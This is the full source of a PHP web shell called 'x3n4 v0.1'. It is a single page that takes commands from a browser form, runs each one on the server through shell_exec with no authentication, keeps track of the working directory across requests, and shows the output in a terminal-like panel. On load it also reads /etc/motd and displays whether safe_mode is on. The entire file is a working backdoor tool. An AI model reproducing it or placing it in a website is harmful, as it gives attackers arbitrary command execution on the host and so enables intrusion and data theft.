<?php

session_start();

function get_shell_prefix()
{
    return get_current_user() . '@' . php_uname('n') . ':' . getcwd() . ' $';
}
function output_json($output = '')
{
    header('Content-Type: application/json;');
    echo json_encode([
        'pwd' => empty($_SESSION['pwd']) ? getcwd() : $_SESSION['pwd'],
        'banner' => get_shell_prefix(),
        'stdout' => $output
    ]);
    session_write_close();
    exit(0);
}
if (!empty($_SESSION['pwd'])) {
    chdir($_SESSION['pwd']);
}
if (isset($_REQUEST['cmd'])) {
    if (empty($_REQUEST['cmd'])) {
        exit(0);
    }
    if (trim($_REQUEST['cmd']) == 'exit') {
        session_destroy();
        exit(0);
    }
    if (substr($_REQUEST['cmd'], 0, 3) === 'cd ') {
        $dir = substr($_REQUEST['cmd'], 3);
        $dir = realpath($dir);
        if (chdir($dir)) {
            $_SESSION['pwd'] = $dir;
            output_json();
        }
    }

    $output = shell_exec($_REQUEST['cmd'] . ' 2>&1');
    output_json($output);
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <title>x3n4 v0.1</title>

    <!-- Bootstrap -->
    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap-theme.min.css" rel="stylesheet">

    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
    <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
    <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
    <style>
    #stdout {
        max-height: 650px;
    }
    </style>
</head>
<body>
    <div class="container">
        <h1 class="page-header">
            <span class="pull-right label label-<?php echo ini_get('safe_mode') ? 'success' : 'danger'; ?>">safe_mode <?php echo ini_get('safe_mode') ? 'ON' : 'OFF'; ?></span>
            x3n4 v0.1
        </h1>

        <pre id="stdout"><?php echo shell_exec('cat /etc/motd') . PHP_EOL; ?></pre>

        <div class="form-group">
            <div class="input-group">
                <span class="input-group-addon hidden-xs" id="pwd"><?php echo get_shell_prefix(); ?></span>
                <input type="text" id="stdin" class="form-control" />
                <span class="input-group-btn">
                    <button type="button" class="btn btn-default" id="btnExecCommand">Send</button>
                </span>
            </div>
        </div>
    </div>

    <!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
    <!-- Include all compiled plugins (below), or include individual files as needed -->
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
    <script>
        function x3n4 () {
            this.execCommand = function(command) {
                if (command.trim() == 'clear') {
                    $('#stdout').html('');
                    return;
                }
                $.post('x3n4.php', {cmd: command}, function(data) {
                    $('#stdout').append(data.banner + " " + command + "\n");
                    if (data.stdout !== null) {
                        $('#stdout').append(data.stdout + "\n");
                    }
                    $('#pwd').html(data.banner);
                    $('#stdout').scrollTop($('#stdout')[0].scrollHeight);
                });
            }
            this.clickExecCommand = function() {
                window.x3n4.execCommand($('#stdin').val());
                $('#stdin').val('');
            }
            this.declareCallbacks = function() {
                $('#btnExecCommand').on('click', this.clickExecCommand);
                $('#stdin').on('keypress', function(ev) {
                    if ((ev.keyCode ? ev.keyCode : ev.which) == '13') {
                        $('#btnExecCommand').click()
                    }
                });
            }
        }
        window.x3n4 = new x3n4();
        window.x3n4.declareCallbacks();
    </script>
</body>
</html>
